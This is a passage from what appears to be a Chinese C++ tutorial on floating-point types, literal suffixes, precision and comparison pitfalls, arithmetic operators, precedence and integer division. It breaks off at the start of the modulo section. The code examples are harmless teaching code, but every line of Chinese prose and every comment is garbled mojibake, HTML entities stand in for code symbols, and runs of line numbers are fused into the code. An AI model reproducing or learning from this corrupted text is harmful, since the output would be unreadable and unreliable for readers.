‡å‡†å°æ•°ç‚¹è¡¨ç¤ºæ³• double price = 99.99; double temperature = -15.5; double small_fraction = .25; // ç­‰åŒäº 0.25 // E è¡¨ç¤ºæ³• double earth_mass = 5.972E24; // åœ°çƒè´¨é‡ (kg) double electron_charge = -1.602e-19; // ç”µå­ç”µè· (åº“ä»‘) double large_number = 1.0e9; // 10 äº¿ std::cout &lt;&lt; &quot;Price: &quot; &lt;&lt; price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Temperature: &quot; &lt;&lt; temperature &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Small fraction: &quot; &lt;&lt; small_fraction &lt;&lt; std::endl; // é»˜è®¤æƒ…å†µä¸‹ï¼Œcout å¯èƒ½å¯¹éå¸¸å¤§æˆ–å°çš„æ•°è‡ªåŠ¨ä½¿ç”¨ç§‘å­¦è®°æ•°æ³•è¾“å‡º std::cout &lt;&lt; &quot;Earth mass: &quot; &lt;&lt; earth_mass &lt;&lt; &quot; kg&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Electron charge: &quot; &lt;&lt; electron_charge &lt;&lt; &quot; C&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Large number: &quot; &lt;&lt; large_number &lt;&lt; std::endl; // å¯ä»¥ä½¿ç”¨ &lt;iomanip&gt; æ§åˆ¶è¾“å‡ºæ ¼å¼ (åç»­ç« èŠ‚ä¼šè¯¦ç»†ä»‹ç») std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); // è®¾ç½®ä¸ºå®šç‚¹è¡¨ç¤ºæ³• std::cout &lt;&lt; &quot;Large number (fixed): &quot; &lt;&lt; large_number &lt;&lt; std::endl; return 0;&#125; 3.3.2 æµ®ç‚¹ç±»å‹C++æä¾›äº†ä¸‰ç§æµ®ç‚¹ç±»å‹ï¼Œå®ƒä»¬åœ¨ç²¾åº¦ï¼ˆæœ‰æ•ˆä½æ•°ï¼‰å’Œå­˜å‚¨èŒƒå›´ä¸Šæœ‰æ‰€ä¸åŒï¼š float: å•ç²¾åº¦æµ®ç‚¹æ•°ã€‚é€šå¸¸å ç”¨ 4 ä¸ªå­—èŠ‚ (32ä½)ã€‚ç²¾åº¦è¾ƒä½ï¼ŒèŒƒå›´è¾ƒå°ã€‚ double: åŒç²¾åº¦æµ®ç‚¹æ•°ã€‚é€šå¸¸å ç”¨ 8 ä¸ªå­—èŠ‚ (64ä½)ã€‚ç²¾åº¦å’ŒèŒƒå›´æ¯” float å¤§å¾ˆå¤šã€‚è¿™æ˜¯C++ä¸­æœ€å¸¸ç”¨çš„æµ®ç‚¹ç±»å‹ï¼Œæµ®ç‚¹å¸¸é‡ï¼ˆå¦‚ 3.14ï¼‰é»˜è®¤å°±æ˜¯ double ç±»å‹ã€‚ long double: æ‰©å±•ç²¾åº¦æµ®ç‚¹æ•°ã€‚é€šå¸¸å ç”¨ 8ã€10ã€12 æˆ– 16 ä¸ªå­—èŠ‚ï¼Œå…·ä½“å–å†³äºç¼–è¯‘å™¨å’Œç³»ç»Ÿã€‚æä¾›æœ€é«˜çš„ç²¾åº¦å’Œæœ€å¤§çš„èŒƒå›´ã€‚ ç²¾åº¦å’ŒèŒƒå›´: ç²¾åº¦ (Precision): æŒ‡çš„æ˜¯å¯ä»¥è¡¨ç¤ºçš„æœ‰æ•ˆæ•°å­—çš„ä½æ•°ã€‚ float é€šå¸¸ä¿è¯è‡³å°‘ 6 ä½æœ‰æ•ˆæ•°å­—ã€‚ double é€šå¸¸ä¿è¯è‡³å°‘ 15 ä½æœ‰æ•ˆæ•°å­—ã€‚ long double é€šå¸¸æä¾›æ¯” double æ›´é«˜çš„ç²¾åº¦ã€‚ èŒƒå›´ (Range): æŒ‡çš„æ˜¯å¯ä»¥è¡¨ç¤ºçš„æœ€å°å’Œæœ€å¤§æ•°å€¼ã€‚double çš„èŒƒå›´è¿œå¤§äº floatï¼Œlong double çš„èŒƒå›´é€šå¸¸æ›´å¤§ã€‚ å¯ä»¥ä½¿ç”¨ &lt;cfloat&gt; (æˆ– C è¯­è¨€çš„ &lt;float.h&gt;) å¤´æ–‡ä»¶ä¸­çš„å¸¸é‡æ¥æŸ¥çœ‹å…·ä½“ç³»ç»Ÿçš„ç²¾åº¦å’ŒèŒƒå›´é™åˆ¶ï¼ˆä¾‹å¦‚ FLT_DIG, DBL_DIG, LDBL_DIG è¡¨ç¤ºæœ‰æ•ˆä½æ•°ï¼‰ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;cfloat&gt; // åŒ…å«æµ®ç‚¹æ•°é™åˆ¶ä¿¡æ¯int main() &#123; // æŸ¥çœ‹å„ç§ç±»å‹å ç”¨çš„å­—èŠ‚æ•° std::cout &lt;&lt; &quot;Size of float: &quot; &lt;&lt; sizeof(float) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of double: &quot; &lt;&lt; sizeof(double) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of long double: &quot; &lt;&lt; sizeof(long double) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // æŸ¥çœ‹ç²¾åº¦ (æœ‰æ•ˆä½æ•°) std::cout &lt;&lt; &quot;Digits of precision for float: &quot; &lt;&lt; FLT_DIG &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Digits of precision for double: &quot; &lt;&lt; DBL_DIG &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Digits of precision for long double: &quot; &lt;&lt; LDBL_DIG &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // å£°æ˜å’Œåˆå§‹åŒ– float f_pi = 3.14159265f; // f åç¼€è¡¨ç¤º float double d_pi = 3.141592653589793; // é»˜è®¤æ˜¯ double long double ld_pi = 3.14159265358979323846L; // L åç¼€è¡¨ç¤º long double std::cout.precision(20); // è®¾ç½® cout è¾“å‡ºç²¾åº¦ä»¥ä¾¿è§‚å¯Ÿå·®å¼‚ std::cout &lt;&lt; &quot;float pi: &quot; &lt;&lt; f_pi &lt;&lt; std::endl; std::cout &lt;&lt; &quot;double pi: &quot; &lt;&lt; d_pi &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long double pi: &quot; &lt;&lt; ld_pi &lt;&lt; std::endl; return 0;&#125; é€‰æ‹©å»ºè®®: é™¤éæœ‰ç‰¹åˆ«çš„å†…å­˜æˆ–æ€§èƒ½è€ƒè™‘ï¼Œå¹¶ä¸”ç¡®å®š float çš„ç²¾åº¦è¶³å¤Ÿï¼Œå¦åˆ™**ä¼˜å…ˆä½¿ç”¨ double**ã€‚å®ƒæ˜¯C++æµ®ç‚¹è®¡ç®—çš„å¸¸ç”¨ç±»å‹ã€‚ å½“éœ€è¦æé«˜çš„ç²¾åº¦æˆ–éå¸¸å¤§çš„æ•°å€¼èŒƒå›´æ—¶ï¼Œä½¿ç”¨ long doubleã€‚ 3.3.3 æµ®ç‚¹å¸¸é‡æµ®ç‚¹å¸¸é‡ï¼ˆå­—é¢å€¼ï¼‰å°±æ˜¯ç›´æ¥å†™åœ¨ä»£ç ä¸­çš„æµ®ç‚¹æ•°å€¼ï¼Œä¾‹å¦‚ 3.14, 1.0, -2.5e8ã€‚ é»˜è®¤ç±»å‹:é»˜è®¤æƒ…å†µä¸‹ï¼ŒC++å°†ä¸å¸¦åç¼€çš„æµ®ç‚¹å¸¸é‡è§†ä¸º double ç±»å‹ã€‚ åç¼€ (Suffixes):å¯ä»¥é€šè¿‡æ·»åŠ åç¼€æ¥æ˜¾å¼æŒ‡å®šæµ®ç‚¹å¸¸é‡çš„ç±»å‹ï¼š f æˆ– F: è¡¨ç¤º float ç±»å‹ã€‚ l æˆ– L: è¡¨ç¤º long double ç±»å‹ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;typeinfo&gt; // ç”¨äº typeid (ä»…ä½œæ¼”ç¤º)int main() &#123; // é»˜è®¤ç±»å‹æ˜¯ double std::cout &lt;&lt; &quot;Type of 3.14: &quot; &lt;&lt; typeid(3.14).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of 1.0e-5: &quot; &lt;&lt; typeid(1.0e-5).name() &lt;&lt; std::endl; // ä½¿ç”¨åç¼€æŒ‡å®šç±»å‹ std::cout &lt;&lt; &quot;Type of 3.14f: &quot; &lt;&lt; typeid(3.14f).name() &lt;&lt; std::endl; // float std::cout &lt;&lt; &quot;Type of 3.14F: &quot; &lt;&lt; typeid(3.14F).name() &lt;&lt; std::endl; // float std::cout &lt;&lt; &quot;Type of 3.14l: &quot; &lt;&lt; typeid(3.14l).name() &lt;&lt; std::endl; // long double std::cout &lt;&lt; &quot;Type of 3.14L: &quot; &lt;&lt; typeid(3.14L).name() &lt;&lt; std::endl; // long double // èµ‹å€¼æ—¶çš„ç±»å‹åŒ¹é… float price = 99.99f; // ä½¿ç”¨ f åç¼€é¿å…ä» double åˆ° float çš„å¯èƒ½ç²¾åº¦æŸå¤±è­¦å‘Š double weight = 75.5; // 75.5 æ˜¯ double, èµ‹å€¼ç»™ double å˜é‡ long double distance = 1.23e10L; // ä½¿ç”¨ L åç¼€ std::cout &lt;&lt; &quot;Price: &quot; &lt;&lt; price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Weight: &quot; &lt;&lt; weight &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Distance: &quot; &lt;&lt; distance &lt;&lt; std::endl; return 0;&#125; (æ³¨æ„: typeid().name() çš„è¾“å‡ºå¯èƒ½å› ç¼–è¯‘å™¨è€Œå¼‚ï¼Œä½†å¯ä»¥å¤§è‡´çœ‹å‡ºç±»å‹) åœ¨å°†å¸¸é‡èµ‹ç»™ float å˜é‡æ—¶ï¼Œä½¿ç”¨ f æˆ– F åç¼€æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼Œå¯ä»¥é¿å…ç¼–è¯‘å™¨äº§ç”Ÿå…³äºä» double è½¬æ¢åˆ° float å¯èƒ½ä¸¢å¤±ç²¾åº¦çš„è­¦å‘Šã€‚ 3.3.4 æµ®ç‚¹æ•°çš„ä¼˜ç¼ºç‚¹æµ®ç‚¹æ•°åœ¨è¡¨ç¤ºå®æ•°æ–¹é¢éå¸¸æœ‰ç”¨ï¼Œä½†ä¹Ÿå­˜åœ¨ä¸€äº›å›ºæœ‰çš„é™åˆ¶å’Œéœ€è¦æ³¨æ„çš„åœ°æ–¹ã€‚ ä¼˜ç‚¹: è¡¨ç¤ºèŒƒå›´å¹¿: å¯ä»¥è¡¨ç¤ºæ¯”æ•´å‹å¤§å¾—å¤šæˆ–å°å¾—å¤šçš„æ•°å€¼ã€‚ è¡¨ç¤ºå°æ•°: å¯ä»¥è¡¨ç¤ºæ•´æ•°æ— æ³•è¡¨ç¤ºçš„å°æ•°éƒ¨åˆ†ã€‚ æ ‡å‡†åŒ–: å¤§å¤šæ•°ç°ä»£è®¡ç®—æœºéƒ½éµå¾ª IEEE 754 æ ‡å‡†æ¥è¡¨ç¤ºå’Œå¤„ç†æµ®ç‚¹æ•°ï¼Œè¿™æé«˜äº†å¯ç§»æ¤æ€§ã€‚ ç¼ºç‚¹: ç²¾åº¦é™åˆ¶: æµ®ç‚¹æ•°åªèƒ½è¿‘ä¼¼åœ°è¡¨ç¤ºå¤§å¤šæ•°å®æ•°ã€‚ç”±äºå†…éƒ¨ä½¿ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºï¼ŒæŸäº›åœ¨åè¿›åˆ¶ä¸‹çœ‹èµ·æ¥å¾ˆç²¾ç¡®çš„å°æ•°ï¼ˆå¦‚ 0.1ï¼‰åœ¨äºŒè¿›åˆ¶æµ®ç‚¹è¡¨ç¤ºä¸­å¯èƒ½æ˜¯æ— é™å¾ªç¯å°æ•°ï¼Œåªèƒ½å­˜å‚¨ä¸€ä¸ªè¿‘ä¼¼å€¼ã€‚è¿™ä¼šå¯¼è‡´å¾®å°çš„**èˆå…¥è¯¯å·® (Rounding Error)**ã€‚ æ¯”è¾ƒå›°éš¾: ç”±äºç²¾åº¦é™åˆ¶ï¼Œç›´æ¥ä½¿ç”¨ == æ¥æ¯”è¾ƒä¸¤ä¸ªæµ®ç‚¹æ•°æ˜¯å¦ç›¸ç­‰é€šå¸¸æ˜¯ä¸å¯é çš„ã€‚å¾®å°çš„èˆå…¥è¯¯å·®å¯èƒ½å¯¼è‡´é€»è¾‘ä¸Šåº”è¯¥ç›¸ç­‰çš„ä¸¤ä¸ªæ•°åœ¨å†…éƒ¨è¡¨ç¤ºä¸Šç•¥æœ‰ä¸åŒã€‚æ¯”è¾ƒæµ®ç‚¹æ•°æ—¶ï¼Œé€šå¸¸åº”è¯¥æ£€æŸ¥å®ƒä»¬çš„å·®å€¼æ˜¯å¦åœ¨ä¸€ä¸ªå¾ˆå°çš„å®¹å·® (Tolerance) èŒƒå›´å†…ã€‚ è¿ç®—é€Ÿåº¦: æµ®ç‚¹è¿ç®—é€šå¸¸æ¯”æ•´å‹è¿ç®—æ…¢ï¼ˆå°½ç®¡ç°ä»£å¤„ç†å™¨æœ‰ä¸“é—¨çš„æµ®ç‚¹å•å…ƒæ¥ä¼˜åŒ–ï¼‰ã€‚ ç‰¹æ®Šå€¼: IEEE 754 æ ‡å‡†å®šä¹‰äº†ä¸€äº›ç‰¹æ®Šå€¼ï¼Œå¦‚ NaN (Not a Numberï¼Œä¾‹å¦‚ 0.0/0.0 çš„ç»“æœ) å’Œæ— ç©·å¤§ (Infinityï¼Œä¾‹å¦‚ 1.0/0.0 çš„ç»“æœ)ï¼Œéœ€è¦åœ¨ä½¿ç”¨æ—¶æ³¨æ„å¤„ç†ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹ (ç²¾åº¦é—®é¢˜å’Œæ¯”è¾ƒ): 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;cmath&gt; // ä¸ºäº† fabs (è®¡ç®—ç»å¯¹å€¼)#include &lt;iomanip&gt; // ä¸ºäº† setprecisionint main() &#123; // ç²¾åº¦é—®é¢˜ç¤ºä¾‹ double a = 0.1; double b = 0.2; double sum = a + b; // ç†è®ºä¸Šåº”è¯¥æ˜¯ 0.3 std::cout &lt;&lt; std::setprecision(20); // æ˜¾ç¤ºæ›´å¤šå°æ•°ä½ std::cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; std::endl; std::cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; std::endl; std::cout &lt;&lt; &quot;a + b = &quot; &lt;&lt; sum &lt;&lt; std::endl; // è¾“å‡ºå¯èƒ½ä¸æ˜¯ç²¾ç¡®çš„ 0.3 if (sum == 0.3) &#123; std::cout &lt;&lt; &quot;Comparison (==): sum is equal to 0.3&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Comparison (==): sum is NOT equal to 0.3&quot; &lt;&lt; std::endl; // å¾ˆå¯èƒ½æ‰§è¡Œè¿™é‡Œ &#125; // æ­£ç¡®çš„æ¯”è¾ƒæ–¹æ³•ï¼šæ£€æŸ¥å·®å€¼æ˜¯å¦åœ¨å®¹å·®èŒƒå›´å†… const double TOLERANCE = 1e-9; // å®šä¹‰ä¸€ä¸ªå¾ˆå°çš„å®¹å·®å€¼ if (std::fabs(sum - 0.3) &lt; TOLERANCE) &#123; std::cout &lt;&lt; &quot;Comparison (tolerance): sum is close enough to 0.3&quot; &lt;&lt; std::endl; // åº”è¯¥æ‰§è¡Œè¿™é‡Œ &#125; else &#123; std::cout &lt;&lt; &quot;Comparison (tolerance): sum is NOT close enough to 0.3&quot; &lt;&lt; std::endl; &#125; // å¦ä¸€ä¸ªä¾‹å­ float x = 1.0f / 3.0f; float y = 3.0f * x; std::cout &lt;&lt; &quot;y = 3.0f * (1.0f / 3.0f) = &quot; &lt;&lt; y &lt;&lt; std::endl; // å¯èƒ½ä¸æ˜¯ç²¾ç¡®çš„ 1.0 return 0;&#125; æ€»ç»“: åœ¨ä½¿ç”¨æµ®ç‚¹æ•°æ—¶ï¼Œè¦æ„è¯†åˆ°å®ƒä»¬æ˜¯è¿‘ä¼¼å€¼ï¼Œå¹¶é¿å…ç›´æ¥è¿›è¡Œç›¸ç­‰æ€§æ¯”è¾ƒã€‚åœ¨éœ€è¦ç²¾ç¡®è®¡ç®—ï¼ˆå¦‚é‡‘èè®¡ç®—ï¼‰çš„åœºåˆï¼Œå¯èƒ½éœ€è¦ä½¿ç”¨ä¸“é—¨çš„åº“æˆ–å®šç‚¹æ•°è¡¨ç¤ºæ³•ã€‚å¯¹äºå¤§å¤šæ•°ç§‘å­¦å’Œå·¥ç¨‹è®¡ç®—ï¼Œdouble æä¾›äº†è¶³å¤Ÿçš„ç²¾åº¦å’ŒèŒƒå›´ã€‚ 3.4 C++ç®—æœ¯è¿ç®—ç¬¦C++æä¾›äº†ä¸°å¯Œçš„è¿ç®—ç¬¦æ¥æ‰§è¡Œç®—æœ¯è®¡ç®—ã€‚æœ¬èŠ‚å°†ä»‹ç»åŸºæœ¬çš„ç®—æœ¯è¿ç®—ç¬¦ã€å®ƒä»¬çš„ä¼˜å…ˆçº§å’Œç»“åˆæ€§ã€æ•´æ•°é™¤æ³•å’Œæ±‚æ¨¡è¿ç®—ã€ç±»å‹è½¬æ¢ä»¥åŠ C++11 å¼•å…¥çš„ auto ç±»å‹æ¨æ–­ã€‚ åŸºæœ¬ç®—æœ¯è¿ç®—ç¬¦: +: åŠ æ³• (Addition) -: å‡æ³• (Subtraction) *: ä¹˜æ³• (Multiplication) /: é™¤æ³• (Division) %: æ±‚æ¨¡ (Modulo) æˆ–æ±‚ä½™ (Remainder) è¿™äº›è¿ç®—ç¬¦å¯ä»¥ç”¨äº C++ çš„æ‰€æœ‰æ•°å€¼ç±»å‹ï¼ˆæ•´å‹å’Œæµ®ç‚¹å‹ï¼‰ï¼Œä½†æ±‚æ¨¡è¿ç®—ç¬¦ % é€šå¸¸åªç”¨äºæ•´æ•°ç±»å‹ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;int main() &#123; double price = 15.50; double tax_rate = 0.08; int quantity = 3; int total_items = 17; int items_per_box = 5; // åŠ æ³• double total_price = price * quantity + 5.0; // å‡è®¾æœ‰ 5 å…ƒé™„åŠ è´¹ std::cout &lt;&lt; &quot;Total price (with fee): &quot; &lt;&lt; total_price &lt;&lt; std::endl; // å‡æ³• double price_before_tax = price / (1 + tax_rate); // å‡è®¾ price å·²å«ç¨ std::cout &lt;&lt; &quot;Price before tax: &quot; &lt;&lt; price_before_tax &lt;&lt; std::endl; // ä¹˜æ³• double tax_amount = price_before_tax * tax_rate; std::cout &lt;&lt; &quot;Tax amount: &quot; &lt;&lt; tax_amount &lt;&lt; std::endl; // é™¤æ³• (æµ®ç‚¹æ•°) double average_price = total_price / quantity; std::cout &lt;&lt; &quot;Average price per item: &quot; &lt;&lt; average_price &lt;&lt; std::endl; // é™¤æ³• (æ•´æ•°) - è§ 3.4.2 int full_boxes = total_items / items_per_box; std::cout &lt;&lt; &quot;Full boxes: &quot; &lt;&lt; full_boxes &lt;&lt; std::endl; // è¾“å‡º 3 // æ±‚æ¨¡ - è§ 3.4.3 int remaining_items = total_items % items_per_box; std::cout &lt;&lt; &quot;Remaining items: &quot; &lt;&lt; remaining_items &lt;&lt; std::endl; // è¾“å‡º 2 // ä¸€å…ƒå‡æ³• (å–è´Ÿ) double discount = -10.0; std::cout &lt;&lt; &quot;Discount: &quot; &lt;&lt; discount &lt;&lt; std::endl; // ä¸€å…ƒåŠ æ³• (é€šå¸¸æ— æ•ˆæœ) double positive_value = +price; std::cout &lt;&lt; &quot;Positive value: &quot; &lt;&lt; positive_value &lt;&lt; std::endl; return 0;&#125; 3.4.1 è¿ç®—ç¬¦ä¼˜å…ˆçº§å’Œç»“åˆæ€§å½“ä¸€ä¸ªè¡¨è¾¾å¼ä¸­åŒ…å«å¤šä¸ªè¿ç®—ç¬¦æ—¶ï¼Œä¼˜å…ˆçº§ (Precedence) å’Œ ç»“åˆæ€§ (Associativity) å†³å®šäº†è¿ç®—çš„æ‰§è¡Œé¡ºåºã€‚ ä¼˜å…ˆçº§: å“ªä¸ªè¿ç®—ç¬¦å…ˆæ‰§è¡Œã€‚ä¼˜å…ˆçº§é«˜çš„è¿ç®—ç¬¦å…ˆäºä¼˜å…ˆçº§ä½çš„è¿ç®—ç¬¦æ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œä¹˜æ³•å’Œé™¤æ³•çš„ä¼˜å…ˆçº§é«˜äºåŠ æ³•å’Œå‡æ³•ã€‚ ç»“åˆæ€§: å½“å¤šä¸ªå…·æœ‰ç›¸åŒä¼˜å…ˆçº§çš„è¿ç®—ç¬¦è¿ç»­å‡ºç°æ—¶ï¼Œå®ƒä»¬çš„æ‰§è¡Œé¡ºåºã€‚ å·¦ç»“åˆæ€§ (Left-to-Right): è¿ç®—ä»å·¦å‘å³æ‰§è¡Œã€‚å¤§å¤šæ•°äºŒå…ƒç®—æœ¯è¿ç®—ç¬¦ï¼ˆ+, -, *, /, %ï¼‰éƒ½æ˜¯å·¦ç»“åˆçš„ã€‚ä¾‹å¦‚ a - b + c ç­‰ä»·äº (a - b) + cã€‚ å³ç»“åˆæ€§ (Right-to-Left): è¿ç®—ä»å³å‘å·¦æ‰§è¡Œã€‚èµ‹å€¼è¿ç®—ç¬¦ = å’Œä¸€å…ƒè¿ç®—ç¬¦ï¼ˆå¦‚å–è´Ÿ -ï¼‰æ˜¯å³ç»“åˆçš„ã€‚ä¾‹å¦‚ a = b = c ç­‰ä»·äº a = (b = c)ã€‚ å¸¸è§ç®—æœ¯è¿ç®—ç¬¦ä¼˜å…ˆçº§ (ç”±é«˜åˆ°ä½): ä¸€å…ƒè¿ç®—ç¬¦: + (æ­£å·), - (è´Ÿå·) - (å³ç»“åˆ) ä¹˜æ³•ã€é™¤æ³•ã€æ±‚æ¨¡: *, /, % - (å·¦ç»“åˆ) åŠ æ³•ã€å‡æ³•: +, - - (å·¦ç»“åˆ) èµ‹å€¼è¿ç®—ç¬¦: = - (å³ç»“åˆ) ä½¿ç”¨æ‹¬å·: å¯ä»¥ä½¿ç”¨åœ†æ‹¬å· () æ¥è¦†ç›–é»˜è®¤çš„ä¼˜å…ˆçº§å’Œç»“åˆæ€§ï¼Œå¼ºåˆ¶æŒ‰ç‰¹å®šé¡ºåºæ‰§è¡Œè¿ç®—ã€‚æ‹¬å·å†…çš„è¡¨è¾¾å¼æ€»æ˜¯æœ€å…ˆè®¡ç®—ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int a = 5, b = 8, c = 3, d = 2; // ä¼˜å…ˆçº§: * é«˜äº + int result1 = a + b * c; // ç­‰ä»·äº a + (b * c) = 5 + (8 * 3) = 5 + 24 = 29 std::cout &lt;&lt; &quot;a + b * c = &quot; &lt;&lt; result1 &lt;&lt; std::endl; // ä½¿ç”¨æ‹¬å·æ”¹å˜é¡ºåº int result2 = (a + b) * c; // (5 + 8) * 3 = 13 * 3 = 39 std::cout &lt;&lt; &quot;(a + b) * c = &quot; &lt;&lt; result2 &lt;&lt; std::endl; // ç»“åˆæ€§ (å·¦ç»“åˆ): / å’Œ * ä¼˜å…ˆçº§ç›¸åŒ int result3 = b / c * d; // ç­‰ä»·äº (b / c) * d = (8 / 3) * d = 2 * d = 2 * 2 = 4 (æ•´æ•°é™¤æ³•) std::cout &lt;&lt; &quot;b / c * d = &quot; &lt;&lt; result3 &lt;&lt; std::endl; // ç»“åˆæ€§ (å³ç»“åˆ): èµ‹å€¼ int x, y, z; x = y = z = 10; // ç­‰ä»·äº x = (y = (z = 10)) std::cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; &quot;, z=&quot; &lt;&lt; z &lt;&lt; std::endl; // è¾“å‡º x=10, y=10, z=10 // ç»“åˆæ€§ (å³ç»“åˆ): ä¸€å…ƒè´Ÿå· int val = - - 5; // ç­‰ä»·äº -(-5) = 5 std::cout &lt;&lt; &quot;- - 5 = &quot; &lt;&lt; val &lt;&lt; std::endl; return 0;&#125; å»ºè®®: å½“è¡¨è¾¾å¼å¤æ‚æˆ–ä¼˜å…ˆçº§ä¸æ˜ç¡®æ—¶ï¼Œä½¿ç”¨æ‹¬å·æ¥æ˜ç¡®è¿ç®—é¡ºåºï¼Œå¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§å¹¶é¿å…é”™è¯¯ã€‚ 3.4.2 é™¤æ³•åˆ†æ”¯C++ çš„é™¤æ³•è¿ç®—ç¬¦ / çš„è¡Œä¸ºå–å†³äºå…¶æ“ä½œæ•° (Operand) çš„ç±»å‹ï¼š æµ®ç‚¹æ•°é™¤æ³•: å¦‚æœæ“ä½œæ•°ä¸­è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯æµ®ç‚¹ç±»å‹ (float, double, long double)ï¼Œåˆ™æ‰§è¡Œæµ®ç‚¹æ•°é™¤æ³•ï¼Œç»“æœä¹Ÿæ˜¯æµ®ç‚¹ç±»å‹ï¼ŒåŒ…å«å°æ•°éƒ¨åˆ†ã€‚ æ•´æ•°é™¤æ³•: å¦‚æœä¸¤ä¸ªæ“ä½œæ•°éƒ½æ˜¯æ•´æ•°ç±»å‹ (int, short, long, char, bool ç­‰)ï¼Œåˆ™æ‰§è¡Œæ•´æ•°é™¤æ³•ã€‚ç»“æœåªä¿ç•™å•†çš„æ•´æ•°éƒ¨åˆ†ï¼Œå°æ•°éƒ¨åˆ†è¢«**æˆªæ–­ (truncated)**ï¼ˆç›´æ¥ä¸¢å¼ƒï¼Œä¸æ˜¯å››èˆäº”å…¥ï¼‰ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; // æµ®ç‚¹æ•°é™¤æ³• double result_f1 = 9.0 / 5.0; // ä¸¤ä¸ª double double result_f2 = 9.0 / 5; // ä¸€ä¸ª double, ä¸€ä¸ª int (int è¢«æå‡ä¸º double) double result_f3 = 9 / 5.0; // ä¸€ä¸ª int, ä¸€ä¸ª double (int è¢«æå‡ä¸º double) float result_f4 = 9.0f / 5.0f; // ä¸¤ä¸ª float std::cout &lt;&lt; &quot;9.0 / 5.0 = &quot; &lt;&lt; result_f1 &lt;&lt; std::endl; // è¾“å‡º 1.8 std::cout &lt;&lt; &quot;9.0 / 5 = &quot; &lt;&lt; result_f2 &lt;&lt; std::endl; // è¾“å‡º 1.8 std::cout &lt;&lt; &quot;9 / 5.0 = &quot; &lt;&lt; result_f3 &lt;&lt; std::endl; // è¾“å‡º 1.8 std::cout &lt;&lt; &quot;9.0f / 5.0f = &quot; &lt;&lt; result_f4 &lt;&lt; std::endl; // è¾“å‡º 1.8 // æ•´æ•°é™¤æ³• int result_i1 = 9 / 5; // ä¸¤ä¸ª int int result_i2 = 10 / 3; // ä¸¤ä¸ª int int result_i3 = 13 / 4; // ä¸¤ä¸ª int int result_i4 = -10 / 3; // è´Ÿæ•°æ•´æ•°é™¤æ³• (ç»“æœé€šå¸¸å‘é›¶æˆªæ–­ï¼Œä¸º -3) std::cout &lt;&lt; &quot;9 / 5 = &quot; &lt;&lt; result_i1 &lt;&lt; std::endl; // è¾“å‡º 1 (å°æ•°éƒ¨åˆ† 0.8 è¢«æˆªæ–­) std::cout &lt;&lt; &quot;10 / 3 = &quot; &lt;&lt; result_i2 &lt;&lt; std::endl; // è¾“å‡º 3 (å°æ•°éƒ¨åˆ† 0.333... è¢«æˆªæ–­) std::cout &lt;&lt; &quot;13 / 4 = &quot; &lt;&lt; result_i3 &lt;&lt; std::endl; // è¾“å‡º 3 (å°æ•°éƒ¨åˆ† 0.25 è¢«æˆªæ–­) std::cout &lt;&lt; &quot;-10 / 3 = &quot; &lt;&lt; result_i4 &lt;&lt; std::endl; // è¾“å‡º -3 // æƒ³è¦å¾—åˆ°æµ®ç‚¹ç»“æœï¼Œéœ€è¦ç¡®ä¿è‡³å°‘ä¸€ä¸ªæ“ä½œæ•°æ˜¯æµ®ç‚¹ç±»å‹ // å¯ä»¥ä½¿ç”¨ç±»å‹è½¬æ¢ (è§ 3.4.4) double result_mixed = double(9) / 5; // å°† 9 è½¬æ¢ä¸º double std::cout &lt;&lt; &quot;double(9) / 5 = &quot; &lt;&lt; result_mixed &lt;&lt; std::endl; // è¾“å‡º 1.8 return 0;&#125; æ³¨æ„: è¿›è¡Œé™¤æ³•è¿ç®—æ—¶ï¼ŒåŠ¡å¿…æ¸…æ¥šæ“ä½œæ•°çš„ç±»å‹ï¼Œä»¥ç¡®ä¿å¾—åˆ°æœŸæœ›çš„ç»“æœï¼ˆæ•´æ•°æˆªæ–­æˆ–æµ®ç‚¹å°æ•°ï¼‰ã€‚ 3.4.3 æ±‚æ¨¡è¿ç®—ç¬¦æ±‚æ¨¡è¿ç®—ç¬¦ % è®¡ç®—æ•´æ•°é™¤æ³•çš„**ä½™æ•° (Remainder)**ã€‚å®ƒè¦æ±‚ä¸¤ä¸ªæ“ä½œæ•°éƒ½å¿…é¡»æ˜¯æ•´æ•°ç±»å‹ï¼ˆæˆ–å¯ä»¥è½¬æ¢ä¸ºæ•´æ•°çš„ç±»å‹ï¼Œå¦‚ char, boolï¼‰ã€‚ è¿ç®—è§„åˆ™:a % b çš„ç»“æœæ˜¯ a é™¤ä»¥ b 